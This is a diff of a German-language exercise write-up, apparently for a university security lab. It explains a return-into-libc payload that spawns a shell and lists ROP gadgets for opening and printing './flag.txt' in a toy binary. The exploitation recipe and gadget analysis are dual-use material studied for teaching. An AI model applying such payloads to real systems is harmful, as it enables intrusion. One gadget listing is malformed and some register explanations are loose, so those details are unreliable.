@@ -46,3 +46,75 @@ Der Stack wird wie folgt aussehen:
 
 Somit ist der erforderliche Input, um den Return-into-libc-Angriff auszuführen:
 `b"A"*128 + b"B"*8 + p64(g(0)) + p64(g(3)) + p64(sh_string) + p64(system_addr) + p64(g(3)) + p64(EXPECTED_EXIT_CODE) + p64(exit_addr)`
+
+## 2.1 Identifizieren und erklären Sie die nötigen Gadgets, um die Parameter von open_file und head zu setzen. In welchen Registern werden welche Parameter übergeben und welche Gadgets verwenden Sie zum setzen der Parameter? Finden und erklären Sie die Gadgets, die es erlauben den Rückgabewert von open_file als 3. Parameter von head zu verwenden.
+
+Um open_file auszuführen, müssen die Register vor dem Aufruf wie folgt gesetzt sein:
+RDI = (Adresse zum String "./flag.txt")
+RSI = String "r\0"
+Der zurückgegebene File Descriptor ist in RAX.
+
+Um head auszuführen, müssen die Register vor dem Aufruf wie folgt gesetzt sein:
+RDI = (Pointer zu some_buffer, um dorthin die Inhalte aus der Datei zu schreiben und auszugeben)
+RSI = 0xff (genauso lang wie some_buffer ist)
+RDX = RAX aus der fopen-Funktion = der File Descriptor der soeben geöffneten Datei
+
+Es stehen uns die folgenden Gadgets zur Verfügung:
+```
+    gadget 0:
+    0x004012b4: xor rdi, r9
+    0x004012b7: ret
+    gadget 1:
+    0x004012c2: mov r9, rax
+    0x004012c5: not r9
+    0x004012c8: ret
+    gadget 2:
+    0x004012d3: pop rcx
+    0x004012d4: call rcx
+    0x004012d6: xor rax, rax
+    0x004012d9: mov rax, qword ptr [rax]
+    0x004012dc: ret
+    gadget 3:
+    0x004012e7: mov qword ptr [rdx], r9
+    0x004012ea: ret
+    gadget 4:
+    0x004012f5: pop rcx
+    0x004012f6: call rcx
+    gadget 5:
+    0x00401302: sub rcx, r8
+    0x00401305: mov rsi, rcx
+    0x00401308: ret
+    gadget 6:
+    0x00401313: xor, rdi
+    0x00401316: ret
+    gadget 7:
+    0x00401321: syscall
+    0x00401323: test rax, rax
+    0x00401326: ret
+    gadget 8:
+    0x00401331: pop rcx
+    0x00401332: pop r8
+    0x00401334: ret
+    gadget 9:
+    0x0040133f: pop rdx
+    0x00401340: ret
+    gadget 10:
+    0x0040134b: mov eax, 0
+    0x00401350: ret
+    gadget 11:
+    0x0040135b: mov rdx, qword ptr [rcx]
+    0x0040135e: pop rcx
+    0x0040135f: ret
+    gadget 12:
+    0x0040136a: add rdi, rdx
+    0x0040136d: ret
+    gadget 13:
+    0x00401378: not rdx
+    0x0040137b: ret
+    gadget 14:
+    0x00401386: xor rax, r9
+    0x00401389: ret
+```
+
+In Gadget 10 wird EAX auf 0 gesetzt, in Gadget 6 wird RDI auf 0 gesetzt. Außerdem wird in Gadget 7 RAX geprüft, ob der Wert 0 ist.
+In Gadget 2, 4, 8, 9, 11 können mit POP Werte in Register eingelesen werden: Nach RCX in Gadgets 2, 4 und 8; nach R8 in Gadget 8, nach RCX in Gadget 11 und nach RDX in Gadget 9
